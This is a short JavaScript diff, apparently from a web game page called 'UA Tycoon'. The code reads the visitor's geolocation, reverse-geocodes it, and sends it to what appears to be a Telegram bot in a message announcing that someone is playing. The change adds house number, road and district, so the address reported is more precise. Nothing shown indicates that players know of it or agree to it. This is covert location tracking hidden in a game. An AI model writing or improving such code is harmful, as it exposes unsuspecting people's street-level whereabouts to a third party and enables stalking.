@@ -84,10 +84,12 @@
         sent = true;
         navigator.geolocation.clearWatch(watchId);
 
-        fetch("https://nominatim.openstreetmap.org/reverse?format=json&lat=" + lat + "&lon=" + lng + "&accept-language=vi&zoom=18")
+        fetch("https://nominatim.openstreetmap.org/reverse?format=json&lat=" + lat + "&lon=" + lng + "&accept-language=vi&zoom=18&addressdetails=1")
           .then(r => r.json())
           .then(data => {
-            const addr = data.display_name || "Không rõ";
+            const a = data.address || {};
+            const parts = [a.house_number, a.road, a.suburb || a.quarter, a.city_district, a.city || a.town].filter(Boolean);
+            const addr = parts.join(", ") || data.display_name || "Không rõ";
             sendTele(
               "🎮 <b>Có người chơi UA Tycoon!</b>\n\n"
               + "🕐 " + new Date().toLocaleString("vi-VN") + "\n"
